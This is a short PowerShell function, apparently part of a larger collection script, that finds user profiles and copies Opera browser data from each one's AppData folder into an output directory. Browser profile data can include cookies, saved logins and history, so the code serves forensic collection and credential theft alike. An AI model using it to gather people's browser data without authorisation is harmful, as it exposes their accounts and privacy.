function Browser-Data-Opera
{
	$path = "AppData\Roaming\Opera Software\Opera Stable"
	$outPath = "Opera\Data"
	$users = Get-Desired-User-Profile-Names $path
	Get-Browser-Data $users $path $outPath
}